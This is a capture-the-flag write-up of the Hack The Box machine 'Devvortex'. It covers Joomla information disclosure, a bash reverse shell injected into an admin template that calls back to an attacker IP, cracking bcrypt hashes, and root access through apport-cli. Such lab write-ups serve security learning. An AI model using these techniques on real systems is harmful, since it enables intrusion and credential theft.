# Initial enumeration
Starting off, I used `nmap` as usual.
```bash
$ sudo nmap -p- --min-rate 10000 -sCV -A 10.10.11.242

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-19 12:23 EDT
Nmap scan report for devvortex.htb (10.10.11.242)
Host is up (0.038s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: DevVortex
|_http-server-header: nginx/1.18.0 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=3/19%OT=22%CT=1%CU=30869%PV=Y%DS=2%DC=T%G=Y%TM=65F9
OS:BC1D%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)
OS:SEQ(SP=105%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)SEQ(SP=106%GCD=1%ISR=10A%TI
OS:=Z%CI=Z%II=I%TS=A)SEQ(SP=106%GCD=1%ISR=10B%TI=Z%CI=Z%II=I%TS=A)OPS(O1=M5
OS:3CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST11NW7%O
OS:6=M53CST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(R=Y%D
OS:F=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0
OS:%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=
OS:Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%
OS:RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%I
OS:PL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 23/tcp)
HOP RTT      ADDRESS
1   40.37 ms 10.10.14.1
2   32.92 ms devvortex.htb (10.10.11.242)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.94 seconds
```
- Domain found: `devvortex.htb`
- Ports open: `22, 80`

Further enumeration using `gobuster` (`vhost`, `dir`, `dns`) doesn't lead to much, although we do find:
- `dev.devvortex.htb`

After enumerating this endpoint with gobuster through directory brute forcing we find:
`dev.devvortex.htb/administrator`

Switching over to the Wappalyzer extension it says the site is Joomla
- [Joomla Hacktrickz](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla)

We find the Joomla version at `/administrator/manifests/files/joomla.xml`
![[Pasted image 20240319122913.png]]

Joomla Version: `4.2.6`

After searching google "Joomla 4.2.6 exploits" we find [CVE-2023-23752](https://www.exploit-db.com/exploits/51334)
if you have `searchsploit` installed locally along with `exploit-db`, you should already have this locally. 
```
Joomla! v4.2.8 - Unauthenticated information disclosure       | php/webapps/51334.rb
/usr/share/exploitdb/exploits/php/webapps/51334.rb
```

After running this exploit:
```bash
 ruby /usr/share/exploitdb/exploits/php/webapps/51334.rb http://dev.devvortex.htb
Users
[649] lewis (lewis) - lewis@devvortex.htb - Super Users
[650] logan paul (logan) - logan@devvortex.htb - Registered

Site info
Site name: Development
Editor: tinymce
Captcha: 0
Access: 1
Debug status: false

Database info
DB type: mysqli
DB host: localhost
DB user: lewis
DB password: P4ntherg0t1n5r3c0n##
DB name: joomla
DB prefix: sd4fg_
DB encryption 0
```


Nice now we have the username and password to login to the login page found at the endpoint `http://dev.devvortex.htb/administrator`
Username: `lewis`
Password: `P4ntherg0t1n5r3c0n##`

After logging into the admin panel, under `System`. we can find an option to customize Administrator templates in browser. From here we can very simply get a reverse shell by selecting any of the templates and adding in the line:
`system('bash -c "bash -i >& /dev/tcp/LOCAL_IP/4444 0>&1"');`

After setting up a local listener, we can then get a shell as the `www-data` user.
```bash
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.14.38] from (UNKNOWN) [10.10.11.242] 60262
bash: cannot set terminal process group (873): Inappropriate ioctl for device
bash: no job control in this shell
www-data@devvortex:~/dev.devvortex.htb/administrator$ python3 --version        
python3 --version
Python 3.8.10
#Updgrading shell to full tty
www-data@devvortex:~/dev.devvortex.htb/administrator$ python3 -c 'import pty;pty.spawn("/bin/bash")'
```

From here, we can note the username and password we found earlier for the database.
```bash
mysql -h localhost -u lewis -pP4ntherg0t1n5r3c0n##

#Show databases
SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| joomla             |
| performance_schema |
+--------------------+

#Use joomla db
USE joomla;

# Show all tables
SHOW TABLES;
# The output from this showed a lot of tables, however the most promising table containing potential sensitive information was:
| sd4fg_users |

# Viewing the data from the sd4fg_users table
SELECT * FROM sd4fg_users;
| id  | name       | username | email               | password                                                     | block | sendEmail | registerDate        | lastvisitDate       | activation | params                                                                                                                                                  | lastResetTime | resetCount | otpKey | otep | requireReset | authProvider |
+-----+------------+----------+---------------------+--------------------------------------------------------------+-------+-----------+---------------------+---------------------+------------+---------------------------------------------------------------------------------------------------------------------------------------------------------+---------------+------------+--------+------+--------------+--------------+
| 649 | lewis      | lewis    | lewis@devvortex.htb | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |     0 |         1 | 2023-09-25 16:44:24 | 2024-03-19 16:03:23 | 0          |                                                                                                                                                         | NULL          |          0 |        |      |            0 |              |
| 650 | logan paul | logan    | logan@devvortex.htb | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |     0 |         0 | 2023-09-26 19:15:42 | NULL                |            | {"admin_style":"","admin_language":"","language":"","editor":"","timezone":"","a11y_mono":"0","a11y_contrast":"0","a11y_highlight":"0","a11y_font":"0"} | NULL  
```


Nice! we got some password hashes now. We can then copy and past these hashes to a file on our host machine and start to try and crack the hashes using `hashcat`.

Firstly, we need to find the correct mode to use for hashcat using `hashid`:
```
hashid '$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12' -m
Analyzing '$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12'
[+] Blowfish(OpenBSD) [Hashcat Mode: 3200]
[+] Woltlab Burning Board 4.x 
[+] bcrypt [Hashcat Mode: 3200]
```

Nice so it is a `bcrypt` hash... Moving on to hashcat:
```bash
hashcat -m 3200 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```
- It takes a bit but eventually we get a hit on the password:
```
$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12:tequieromucho
```

Now SSH'ing into the host:
```
ssh logan@devvortex.htb  
The authenticity of host 'devvortex.htb (10.10.11.242)' can't be established.
ED25519 key fingerprint is SHA256:RoZ8jwEnGGByxNt04+A/cdluslAwhmiWqG3ebyZko+A.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:15: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'devvortex.htb' (ED25519) to the list of known hosts.
logan@devvortex.htb's password:
```

Now, after grabbing the flag `user.txt` we can move on to escalating privileges to the root user.
```bash
sudo -l
[sudo] password for logan:
Matching Defaults entries for logan on devvortex:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli
```

From this information, we then google: `"apport-cli sudo privilege escalation"`.
We then find a PoC for [CVE-2023-1326](https://github.com/diego-tella/CVE-2023-1326-PoC).

This privilege escalation attack was found in apport-cli 2.26.0 and earlier.
We can check if this version of `apport-cli` is vulnerable using the command:
`sudo /usr/bin/apport-cli -v`
```
2.20.11
```

Interesting, although it isn't an exact match on the version it is still worth a shot. However currently there isn't a crash file present at `/var/crash/` to use based off of the PoC in the link.

After checking what a valid crash report file looks like (format wise) from [here](https://wiki.ubuntu.com/Apport?action=AttachFile&do=get&target=data-format.pdf)

We can make a `example.crash` file as follows:
```
ProblemType: Crash
Architecture: amd64
```

Now testing the exploit:
```
sudo /usr/bin/apport-cli -c ./example.crash
..
..
..

Please choose (S/V/K/I/C): V
!/bin/bash
```
Nice, now we have root!
```
whoami
root

cd ~/root
cat root.txt
```